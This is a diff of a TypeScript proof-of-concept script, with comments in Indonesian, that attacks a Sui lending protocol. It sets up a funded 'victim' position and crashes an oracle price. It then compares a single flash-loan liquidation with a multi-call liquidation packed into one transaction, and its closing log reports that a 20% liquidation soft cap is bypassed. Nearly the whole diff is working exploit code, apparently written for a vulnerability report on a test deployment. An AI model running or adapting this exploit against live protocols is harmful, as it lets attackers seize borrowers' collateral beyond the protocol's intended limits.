@@ -38,18 +38,18 @@ console.log(`[INIT] Funder Address: ${funderAddress}`);
 
 // ==================== HELPER FUNCTIONS ====================
 
-async function executeTx(tx, keypair) {
+async function executeTx(tx: Transaction, keypair: Ed25519Keypair) {
     tx.setSender(keypair.getPublicKey().toSuiAddress());
     const result = await client.signAndExecuteTransaction({
         signer: keypair,
         transaction: tx,
-        options: { showEffects: true, showObjectChanges: true },
+        options: { showEffects: true, showObjectChanges: true }
     });
-    await new Promise(r => setTimeout(r, 1500));
+    await new Promise(r => setTimeout(r, 1500)); // Jeda 1.5 detik
     return result;
 }
 
-async function printBalances(address) {
+async function printBalances(address: string) {
     const suiBalance = await client.getBalance({ owner: address, coinType: SUI_TYPE });
     const usdcBalance = await client.getBalance({ owner: address, coinType: USDC_TYPE });
     const ethBalance = await client.getBalance({ owner: address, coinType: ETH_TYPE });
@@ -61,24 +61,18 @@ async function printBalances(address) {
     );
 }
 
-async function readObligationState(obligationId) {
+async function readObligationState(obligationId: string) {
     const fields = await client.getDynamicFields({ parentId: obligationId });
     let collateralAmount = 0n, debtUSDC = 0n, debtETH = 0n;
     for (const field of fields.data) {
-        const fieldData = await client.getDynamicFieldObject({
-            parentId: obligationId,
-            name: field.name,
-        });
+        const fieldData = await client.getDynamicFieldObject({ parentId: obligationId, name: field.name });
         const fieldName = JSON.stringify(field.name);
         const fieldValue = fieldData?.data?.content?.fields;
         if (fieldName.includes("Collateral") && fieldValue) {
             collateralAmount = BigInt(fieldValue.amount || 0);
         } else if (fieldName.includes("Debt") && fieldValue) {
-            if (fieldName.includes("USDC")) {
-                debtUSDC = BigInt(fieldValue.amount || 0);
-            } else if (fieldName.includes("ETH")) {
-                debtETH = BigInt(fieldValue.amount || 0);
-            }
+            if (fieldName.includes("USDC")) debtUSDC = BigInt(fieldValue.amount || 0);
+            else if (fieldName.includes("ETH")) debtETH = BigInt(fieldValue.amount || 0);
         }
     }
     return { collateralAmount, debtUSDC, debtETH };
@@ -86,20 +80,18 @@ async function readObligationState(obligationId) {
 
 // ==================== PHASE 1: SETUP VICTIM ====================
 
-async function setupVictim(victimKeypair, label) {
+async function setupVictim(victimKeypair: Ed25519Keypair, label: string) {
     const victimAddr = victimKeypair.getPublicKey().toSuiAddress();
     console.log(`\n[${label}] Setting up victim at ${victimAddr}...`);
 
     // --- STEP 1: Fund victim dengan 1010 SUI ---
     const fundTx = new Transaction();
     const [suiCoin] = fundTx.splitCoins(fundTx.gas, [1_010_000_000_000n]);
-    fundTx.transferObjects([suiCoin], victimAddr);
+    fundTx.transferObjects([suiCoin], victimAddr); 
     await executeTx(fundTx, funderKeypair);
     console.log(`[${label}] Step 1 done: Funded victim with 1010 SUI`);
 
     // --- STEP 2: Open Obligation menggunakan open_obligation_entry ---
-    // Menggunakan fungsi entry agar obligation langsung di-share secara internal
-    // tanpa perlu menangani hot potato di sisi TypeScript.
     const openTx = new Transaction();
     openTx.moveCall({
         target: `${PKG}::open_obligation::open_obligation_entry`,
@@ -108,35 +100,28 @@ async function setupVictim(victimKeypair, label) {
     const openResult = await executeTx(openTx, victimKeypair);
     console.log(`[${label}] Step 2 done: Obligation opened`);
 
-    // FIX: Gunakan else if agar obligationId dan obligationKeyId tidak saling
-    // menimpa satu sama lain ketika objectType mengandung string yang sama.
+    // Ambil obligationId dan obligationKeyId dari objectChanges
+    // FIX: Gunakan endsWith() agar ObligationKey tidak tertukar dengan Obligation
     let obligationId = "";
     let obligationKeyId = "";
     for (const obj of openResult.objectChanges || []) {
-        if (obj.type === "created" && obj.objectType?.includes("obligation::ObligationKey")) {
-            // Periksa ObligationKey lebih dulu karena stringnya lebih spesifik
-            obligationKeyId = obj.objectId;
-        } else if (obj.type === "created" && obj.objectType?.includes("obligation::Obligation")) {
+        if (obj.type === "created" && obj.objectType?.endsWith("::obligation::Obligation")) {
             obligationId = obj.objectId;
+        }
+        if (obj.type === "created" && obj.objectType?.endsWith("::obligation::ObligationKey")) {
+            obligationKeyId = obj.objectId;
         }
     }
 
     if (!obligationId || !obligationKeyId) {
-        throw new Error(
-            `[${label}] Failed to parse obligationId or obligationKeyId.\n` +
-            `objectChanges: ${JSON.stringify(openResult.objectChanges, null, 2)}`
-        );
+        throw new Error(`[${label}] Failed to find obligationId or obligationKeyId in objectChanges`);
     }
-
-    console.log(`[${label}] Obligation ID:    ${obligationId}`);
+    console.log(`[${label}] Obligation ID: ${obligationId}`);
     console.log(`[${label}] ObligationKey ID: ${obligationKeyId}`);
 
     // --- STEP 3: Deposit SUI Collateral ---
-    // Split langsung dari gas dalam PTB yang sama.
-    // Hasil splitCoins adalah TransactionArgument — langsung pakai tanpa tx.object().
-    // [Transaction Basics](https://sdk.mystenlabs.com/sui/transactions/basics#return-values "kapa-citation")
     const depositTx = new Transaction();
-    const [collateralCoin] = depositTx.splitCoins(depositTx.gas, [1_000_000_000_000n]);
+    const [collateralCoin] = depositTx.splitCoins(depositTx.gas, [1_000_000_000_000n]); // 1000 SUI
     depositTx.moveCall({
         target: `${PKG}::deposit_collateral::deposit_collateral`,
         typeArguments: [SUI_TYPE],
@@ -144,22 +129,20 @@ async function setupVictim(victimKeypair, label) {
             depositTx.object(VERSION),
             depositTx.object(obligationId),
             depositTx.object(MARKET),
-            collateralCoin, // TransactionArgument langsung dari splitCoins
+            collateralCoin, 
         ],
     });
     await executeTx(depositTx, victimKeypair);
     console.log(`[${label}] Step 3 done: Deposited 1000 SUI collateral`);
 
     // --- STEP 4: Mint & Supply USDC & ETH ke Market ---
-    // Semua argumen numerik menggunakan tx.pure.u64() secara eksplisit.
-    // [Commands Reference](https://sdk.mystenlabs.com/sui/transactions/reference "kapa-citation")
     const supplyTx = new Transaction();
 
     const [usdcCoin] = supplyTx.moveCall({
         target: `${TEST_COIN_PKG}::usdc::mint`,
         arguments: [
             supplyTx.object(USDC_TREASURY),
-            supplyTx.pure.u64(100_000_000_000_000n),
+            supplyTx.pure.u64(100_000_000_000_000n), 
         ],
     });
     const [sUSDC] = supplyTx.moveCall({
@@ -168,7 +151,7 @@ async function setupVictim(victimKeypair, label) {
         arguments: [
             supplyTx.object(VERSION),
             supplyTx.object(MARKET),
-            usdcCoin,
+            usdcCoin, 
             supplyTx.object(CLOCK),
         ],
     });
@@ -182,7 +165,7 @@ async function setupVictim(victimKeypair, label) {
         target: `${TEST_COIN_PKG}::eth::mint`,
         arguments: [
             supplyTx.object(ETH_TREASURY),
-            supplyTx.pure.u64(10_000_000_000n),
+            supplyTx.pure.u64(10_000_000_000n), 
         ],
     });
     const [sETH] = supplyTx.moveCall({
@@ -191,7 +174,7 @@ async function setupVictim(victimKeypair, label) {
         arguments: [
             supplyTx.object(VERSION),
             supplyTx.object(MARKET),
-            ethCoin,
+            ethCoin, 
             supplyTx.object(CLOCK),
         ],
     });
@@ -202,9 +185,9 @@ async function setupVictim(victimKeypair, label) {
     });
 
     await executeTx(supplyTx, funderKeypair);
-    console.log(`[${label}] Step 4 done: Minted and supplied USDC and ETH to market`);
+    console.log(`[${label}] Step 4 done: Minted & supplied USDC and ETH to market`);
 
-    // --- STEP 5: Borrow USDC ---
+    // --- STEP 5: Borrow USDC (500 USDC = 500_000_000 dengan 6 desimal) ---
     const borrowUSDCTx = new Transaction();
     const [borrowedUSDC] = borrowUSDCTx.moveCall({
         target: `${PKG}::borrow::borrow`,
@@ -215,7 +198,7 @@ async function setupVictim(victimKeypair, label) {
             borrowUSDCTx.object(obligationKeyId),
             borrowUSDCTx.object(MARKET),
             borrowUSDCTx.object(REGISTRY),
-            borrowUSDCTx.pure.u64(500_000_000n),
+            borrowUSDCTx.pure.u64(500_000_000n), 
             borrowUSDCTx.object(ORACLE),
             borrowUSDCTx.object(CLOCK),
         ],
@@ -224,7 +207,7 @@ async function setupVictim(victimKeypair, label) {
     await executeTx(borrowUSDCTx, victimKeypair);
     console.log(`[${label}] Step 5 done: Borrowed 500 USDC`);
 
-    // --- STEP 6: Borrow ETH ---
+    // --- STEP 6: Borrow ETH (0.2 ETH = 200_000_000 dengan 9 desimal) ---
     const borrowETHTx = new Transaction();
     const [borrowedETH] = borrowETHTx.moveCall({
         target: `${PKG}::borrow::borrow`,
@@ -235,7 +218,7 @@ async function setupVictim(victimKeypair, label) {
             borrowETHTx.object(obligationKeyId),
             borrowETHTx.object(MARKET),
             borrowETHTx.object(REGISTRY),
-            borrowETHTx.pure.u64(200_000_000n),
+            borrowETHTx.pure.u64(200_000_000n), 
             borrowETHTx.object(ORACLE),
             borrowETHTx.object(CLOCK),
         ],
@@ -259,7 +242,7 @@ async function crashOraclePrice() {
         arguments: [
             tx.object(ORACLE),
             tx.object(CLOCK),
-            tx.pure.u64(40_000_000n),
+            tx.pure.u64(40_000_000n), 
         ],
     });
     await executeTx(tx, funderKeypair);
@@ -268,7 +251,7 @@ async function crashOraclePrice() {
 
 // ==================== PHASE 3: BEFORE EXPLOIT (Single Call) ====================
 
-async function beforeExploit_singleCall(victimObligationId) {
+async function beforeExploit_singleCall(victimObligationId: string) {
     console.log("\n" + "=".repeat(60));
     console.log("BEFORE EXPLOIT: Single Liquidation Call");
     console.log("=".repeat(60));
@@ -284,7 +267,7 @@ async function beforeExploit_singleCall(victimObligationId) {
         arguments: [
             tx.object(VERSION),
             tx.object(MARKET),
-            tx.pure.u64(50_000_000_000n),
+            tx.pure.u64(50_000_000_000n), 
         ],
     });
 
@@ -295,7 +278,7 @@ async function beforeExploit_singleCall(victimObligationId) {
             tx.object(VERSION),
             tx.object(victimObligationId),
             tx.object(MARKET),
-            flashUSDC,
+            flashUSDC, 
             tx.object(REGISTRY),
             tx.object(ORACLE),
             tx.object(CLOCK),
@@ -308,7 +291,7 @@ async function beforeExploit_singleCall(victimObligationId) {
         arguments: [
             tx.object(VERSION),
             tx.object(MARKET),
-            remainUSDC,
+            remainUSDC, 
             flashReceipt,
         ],
     });
@@ -325,7 +308,7 @@ async function beforeExploit_singleCall(victimObligationId) {
 
 // ==================== PHASE 4: AFTER EXPLOIT (Multi Call) ====================
 
-async function afterExploit_multiCall(victimObligationId) {
+async function afterExploit_multiCall(victimObligationId: string) {
     console.log("\n" + "=".repeat(60));
     console.log("AFTER EXPLOIT: Multi-Call Liquidation");
     console.log("=".repeat(60));
@@ -339,7 +322,6 @@ async function afterExploit_multiCall(victimObligationId) {
         typeArguments: [USDC_TYPE],
         arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(50_000_000_000n)],
     });
-
     const [f_ETH, r_ETH] = tx.moveCall({
         target: `${PKG}::flash_loan::borrow_flash_loan`,
         typeArguments: [ETH_TYPE],
@@ -379,7 +361,6 @@ async function afterExploit_multiCall(victimObligationId) {
         typeArguments: [USDC_TYPE],
         arguments: [tx.object(VERSION), tx.object(MARKET), rem1, r_USDC],
     });
-
     tx.moveCall({
         target: `${PKG}::flash_loan::repay_flash_loan`,
         typeArguments: [ETH_TYPE],
@@ -434,4 +415,4 @@ async function main() {
     console.log(`[IMPACT] 20% Soft Cap was BYPASSED via Multi-Call in single PTB!`);
 }
 
-main().catch(
+main().catch(console.error);
